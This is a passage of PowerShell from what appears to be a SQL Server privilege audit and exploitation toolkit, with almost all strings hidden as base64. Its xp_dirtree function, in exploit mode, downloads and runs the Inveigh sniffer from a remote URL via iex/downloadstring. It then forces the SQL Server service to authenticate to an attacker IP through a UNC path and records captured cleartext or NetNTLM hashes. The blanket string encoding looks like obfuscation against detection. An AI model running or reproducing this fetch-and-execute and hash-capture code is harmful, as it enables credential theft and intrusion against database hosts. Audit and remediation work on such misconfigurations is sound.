        $AutoCount = $AutoProcs | measure | select count -ExpandProperty count
        if($AutoCount -eq 0){
            Write-Verbose "$Instance : No stored procedures were found configured to auto execute."
            return
        }
        Write-Verbose "$Instance : Checking permissions..."
        $AutoProcs | 
        foreach-object {
            $ComputerName = $_.ComputerName
            $Instance = $_.Instance
            $DatabaseName = $_.DatabaseName
            $SchemaName = $_.SchemaName
            $ProcedureName = $_.ProcedureName
            $ProcedureType = $_.ProcedureType
            $ProcedureDefinition = $_.ProcedureDefinition
            $SQL_DATA_ACCESS = $_.SQL_DATA_ACCESS
            $ROUTINE_BODY = $_.ROUTINE_BODY
            $CREATED = $_.CREATED
            $LAST_ALTERED = $_.LAST_ALTERED
            $is_ms_shipped = $_.is_ms_shipped
            $is_auto_executed = $_.is_auto_executed    
	        $Results = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
            ? {$_.objectname -like "$ProcedureName"}
            $PermCount = $Results | measure | select count -ExpandProperty count
            if($PermCount -ge 1){
                $Results | 
                % {
                    $PrincipalName = $_.PrincipalName
                    $PrincipalType = $_.PrincipalType
                    $PermissionName = $_.PermissionName
                    $PermissionType = $_.PermissionType
                    $StateDescription = $_.StateDescription
                    $ObjectType = $_.ObjectType
                    $ObjectName = $_.ObjectName
                    $FullSpName = "$DatabaseName.$SchemaName.$ProcedureName"
                    $TblAutoExecPrivs.Rows.Add(
                        $ComputerName,
                        $Instance,
                        $DatabaseName,
                        $SchemaName,
                        $ProcedureName,
                        $ProcedureType,
                        $ProcedureDefinition,
                        $SQL_DATA_ACCESS,
                        $ROUTINE_BODY,
                        $CREATED,
                        $LAST_ALTERED,
                        $is_ms_shipped,
                        $is_auto_executed,
                        $PrincipalName,
                        $PrincipalType,
                        $PermissionName,
                        $PermissionType,
                        $StateDescription,
                        $ObjectName,
                        $ObjectType
                    ) | Out-Null
                    Write-Verbose -Message "$Instance : - $PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $Details = "$PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)            
                }
            }
        }
        $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivXpDirtree
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        $CurrentLoginRoles | % -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABFAHgAZQBjAHUAdABlACAAeABwAF8AZABpAHIAdAByAGUAZQA=')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZABpAHIAdAByAGUAZQAgAGkAcwAgAGEAIABuAGEAdABpAHYAZQAgAGUAeAB0AGUAbgBkAGUAZAAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAIAB0AGgAYQB0ACAAYwBhAG4AIABiAGUAIABlAHgAZQBjAHUAdABlAGQAIABiAHkAIABtAGUAbQBiAGUAcgBzACAAbwBmACAAdABoAGUAIABQAHUAYgBsAGkAYwAgAHIAbwBsAGUAIABiAHkAIABkAGUAZgBhAHUAbAB0ACAAaQBuACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgADIAMAAwADAALQAyADAAMQA0AC4AIABYAHAAXwBkAGkAcgB0AHIAZQBlACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAdABvACAAZgBvAHIAYwBlACAAdABoAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAcwBlAHIAdgBpAGMAZQAgAGEAYwBjAG8AdQBuAHQAIAB0AG8AIABhAHUAdABoAGUAbgB0AGkAYwBhAHQAZQAgAHQAbwAgAGEAIAByAGUAbQBvAHQAZQAgAGEAdAB0AGEAYwBrAGUAcgAuACAAIABUAGgAZQAgAHMAZQByAHYAaQBjAGUAIABhAGMAYwBvAHUAbgB0ACAAcABhAHMAcwB3AG8AcgBkACAAaABhAHMAaAAgAGMAYQBuACAAdABoAGUAbgAgAGIAZQAgAGMAYQBwAHQAdQByAGUAZAAgACsAIABjAHIAYQBjAGsAZQBkACAAbwByACAAcgBlAGwAYQB5AGUAZAAgAHQAbwAgAGcAYQBpAG4AIAB1AG4AYQB1AHQAaABvAHIAaQB6AGUAZAAgAGEAYwBjAGUAcwBzACAAdABvACAAcwB5AHMAdABlAG0AcwAuACAAVABoAGkAcwAgAGEAbABzAG8AIABtAGUAYQBuAHMAIAB4AHAAXwBkAGkAcgB0AHIAZQBlACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAdABvACAAZQBzAGMAYQBsAGEAdABlACAAYQAgAGwAbwB3AGUAcgAgAHAAcgBpAHYAaQBsAGUAZwBlAGQAIAB1AHMAZQByACAAdABvACAAcwB5AHMAYQBkAG0AaQBuACAAdwBoAGUAbgAgAGEAIABtAGEAYwBoAGkAbgBlACAAbwByACAAbQBhAG4AYQBnAGUAZAAgAGEAYwBjAG8AdQBuAHQAIABpAHMAbgB0ACAAYgBlAGkAbgBnACAAdQBzAGUAZAAuACAAIABUAGgAYQB0AHMAIABiAGUAYwBhAHUAcwBlACAAdABoAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAcwBlAHIAdgBpAGMAZQAgAGEAYwBjAG8AdQBuAHQAIABpAHMAIABhACAAbQBlAG0AYgBlAHIAIABvAGYAIAB0AGgAZQAgAHMAeQBzAGEAZABtAGkAbgAgAHIAbwBsAGUAIABpAG4AIABTAFEATAAgAFMAZQByAHYAZQByACAAMgAwADAAMAAtADIAMAAxADQALAAgAGIAeQAgAGQAZQBmAGEAdQBsAHQALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGUAIABFAFgARQBDAFUAVABFACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAG8AbgAgAHQAaABlACAAWABQAF8ARABJAFIAVABSAEUARQAgAHAAcgBvAGMAZQBkAHUAcgBlACAAZgBvAHIAIABuAG8AbgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABpAHYAZQAgAGwAbwBnAGkAbgBzACAAYQBuAGQAIAByAG8AbABlAHMALgAgACAARQB4AGEAbQBwAGwAZQAgAGMAbwBtAG0AYQBuAGQAOgAgAFIARQBWAE8ASwBFACAARQBYAEUAQwBVAFQARQAgAE8ATgAgAHgAcABfAGQAaQByAHQAcgBlAGUAIAB0AG8AIABQAHUAYgBsAGkAYwA=')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGEAYwBrACAAdABoAGUAIABwAGEAcwBzAHcAbwByAGQAIABoAGEAcwBoACAAbwBmAGYAbABpAG4AZQAgAG8AcgAgAHIAZQBsAGEAeQAgAGkAdAAgAHQAbwAgAGEAbgBvAHQAaABlAHIAIABzAHkAcwB0AGUAbQAuAA==')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AZQB4AGUAYwB1AHQAaQBuAGcALQBzAG0AYgAtAHIAZQBsAGEAeQAtAGEAdAB0AGEAYwBrAHMALQB2AGkAYQAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQB1AHMAaQBuAGcALQBtAGUAdABhAHMAcABsAG8AaQB0AC8A')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | ? -FilterScript {
            $_.ObjectName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZABpAHIAdAByAGUAZQA='))) -and $_.PermissionName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQA='))) -and $_.statedescription -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGEAbgB0AA==')))
        }
        if($DirTreePrivs)
        {
            Write-Verbose -Message "$Instance : - At least one principal has EXECUTE privileges on xp_dirtree."
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            if($Exploit){
                $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                $IsAdmin = $prp.IsInRole($adm)
                if(-not $IsAdmin)
                {
                    Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                    $IAMADMIN = 'No'
                }else{
                    Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                    $IAMADMIN = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                }
            }
            $DirTreePrivs |
            % -Process {
                $PrincipalName = $DirTreePrivs.PrincipalName
                $CurrentPrincpalList |
                % -Process {
                    $PrincipalCheck = $_
                    if($PrincipalName -eq $PrincipalCheck -or $PrincipalName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB1AGIAbABpAGMA'))))
                    {
                        $IsExploitable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))                      
                        if(($IAMADMIN -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))) -and ($Exploit))
                        {
                            if(-not $AttackerIp)
                            {
                                $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                                    select -ExpandProperty Ipv4Address |
                                select -Property IPAddressToString -ExpandProperty IPAddressToString)
                                if($AttackerIp -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA'))))
                                {
                                    $AttackerIp = gwmi -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                    select -First 1 -Property @{
                                        Name       = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA')))
                                        Expression = {
                                            [regex]$rx = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAGQAewAxACwAMwB9ACgAXAAuAD8AKQApAHsANAB9AA=='))); $rx.matches($_.IPAddress)[0].Value
                                        }
                                    } |
                                    select -Property IPaddress -ExpandProperty IPAddress -First 1
                                }
                            }
                            iex -Command (New-Object -TypeName system.net.webclient).downloadstring($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBLAGUAdgBpAG4ALQBSAG8AYgBlAHIAdABzAG8AbgAvAEkAbgB2AGUAaQBnAGgALwBtAGEAcwB0AGUAcgAvAEkAbgB2AGUAaQBnAGgALgBwAHMAMQA='))))
                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA='))))
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                sleep -s $TimeOut
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."
                                $HashType = ''
                                $Hash = ''
                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                if($PassCleartext)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAHQAZQB4AHQA')))
                                    $Hash = $PassCleartext
                                }
                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                if($PassNetNTLMv1)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADEA')))
                                    $Hash = $PassNetNTLMv1
                                }
                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                if($PassNetNTLMv2)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADIA')))
                                    $Hash = $PassNetNTLMv2
                                }
                                if($Hash)
                                {
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    $Exploited = 'No'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."
                                }
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database."
                        }
                    }
                    else
                    {
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges the xp_dirtree procedure in the master database."
                    }
                }
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivXpFileexist
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        $CurrentLoginRoles | % -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABFAHgAZQBjAHUAdABlACAAeABwAF8AZgBpAGwAZQBlAHgAaQBzAHQA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZgBpAGwAZQBlAHgAaQBzAHQAIABpAHMAIABhACAAbgBhAHQAaQB2AGUAIABlAHgAdABlAG4AZABlAGQAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlACAAdABoAGEAdAAgAGMAYQBuACAAYgBlACAAZQB4AGUAYwB1AHQAZQBkACAAYgB5ACAAbQBlAG0AYgBlAHIAcwAgAG8AZgAgAHQAaABlACAAUAB1AGIAbABpAGMAIAByAG8AbABlACAAYgB5ACAAZABlAGYAYQB1AGwAdAAgAGkAbgAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIAAyADAAMAAwAC0AMgAwADEANAAuACAAWABwAF8AZABpAHIAdAByAGUAZQAgAGMAYQBuACAAYgBlACAAdQBzAGUAZAAgAHQAbwAgAGYAbwByAGMAZQAgAHQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIABhAGMAYwBvAHUAbgB0ACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABhAHQAdABhAGMAawBlAHIALgAgACAAVABoAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdAAgAHAAYQBzAHMAdwBvAHIAZAAgAGgAYQBzAGgAIABjAGEAbgAgAHQAaABlAG4AIABiAGUAIABjAGEAcAB0AHUAcgBlAGQAIAArACAAYwByAGEAYwBrAGUAZAAgAG8AcgAgAHIAZQBsAGEAeQBlAGQAIAB0AG8AIABnAGEAaQBuACAAdQBuAGEAdQB0AGgAbwByAGkAegBlAGQAIABhAGMAYwBlAHMAcwAgAHQAbwAgAHMAeQBzAHQAZQBtAHMALgAgAFQAaABpAHMAIABhAGwAcwBvACAAbQBlAGEAbgBzACAAeABwAF8AZABpAHIAdAByAGUAZQAgAGMAYQBuACAAYgBlACAAdQBzAGUAZAAgAHQAbwAgAGUAcwBjAGEAbABhAHQAZQAgAGEAIABsAG8AdwBlAHIAIABwAHIAaQB2AGkAbABlAGcAZQBkACAAdQBzAGUAcgAgAHQAbwAgAHMAeQBzAGEAZABtAGkAbgAgAHcAaABlAG4AIABhACAAbQBhAGMAaABpAG4AZQAgAG8AcgAgAG0AYQBuAGEAZwBlAGQAIABhAGMAYwBvAHUAbgB0ACAAaQBzAG4AdAAgAGIAZQBpAG4AZwAgAHUAcwBlAGQALgAgACAAVABoAGEAdABzACAAYgBlAGMAYQB1AHMAZQAgAHQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIABhAGMAYwBvAHUAbgB0ACAAaQBzACAAYQAgAG0AZQBtAGIAZQByACAAbwBmACAAdABoAGUAIABzAHkAcwBhAGQAbQBpAG4AIAByAG8AbABlACAAaQBuACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgADIAMAAwADAALQAyADAAMQA0ACwAIABiAHkAIABkAGUAZgBhAHUAbAB0AC4A')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGUAIABFAFgARQBDAFUAVABFACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAG8AbgAgAHQAaABlACAAeABwAF8AZgBpAGwAZQBlAHgAaQBzAHQAIABwAHIAbwBjAGUAZAB1AHIAZQAgAGYAbwByACAAbgBvAG4AIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAaQB2AGUAIABsAG8AZwBpAG4AcwAgAGEAbgBkACAAcgBvAGwAZQBzAC4AIAAgAEUAeABhAG0AcABsAGUAIABjAG8AbQBtAGEAbgBkADoAIABSAEUAVgBPAEsARQAgAEUAWABFAEMAVQBUAEUAIABPAE4AIAB4AHAAXwBmAGkAbABlAGUAeABpAHMAdAAgAHQAbwAgAFAAdQBiAGwAaQBjAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
